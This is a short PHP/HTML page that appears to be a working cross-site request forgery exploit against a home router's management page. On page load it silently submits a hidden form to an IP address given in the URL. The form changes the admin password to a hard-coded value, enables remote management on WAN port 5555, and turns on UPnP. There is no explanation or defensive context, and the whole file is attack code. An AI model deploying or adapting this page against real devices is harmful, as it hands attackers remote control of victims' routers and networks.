<? 
//collect some info
$ip = $_GET["ip"]; 
$wan = $_SERVER['REMOTE_ADDR'];
?>

<html>
<head>
</head>
<body onload="sendPayload()">
	<FORM id=password name=password action="http://<? echo $ip; ?>/manage.tri" method=post>
	<input type=hidden name=remote_mgt_https value=0>
	<input type=hidden name=http_enable value=1>
	<input type=hidden name=https_enable value=0>
	<input type=hidden name=PasswdModify value=0>
	<input type=hidden name=http_passwd value=d6nw5v1x2pc7st9m>
	<input type=hidden name=http_passwdConfirm value=d6nw5v1x2pc7st9m>
	<input type=hidden name=_http_enable value=1>
	<input type=hidden name=web_wl_filter value=1>
	<input type=hidden name=remote_management value=1>
	<input type=hidden name=http_wanport value=5555>
	<input type=hidden name=upnp_enable value=1>
	<input type=hidden name=layout value=en>
	<input type="submit" value="submit"> 
	</FORM>
	
	<script>
	function sendPayload(){
		document.password.submit();
	}
	</script>
</body>
</html>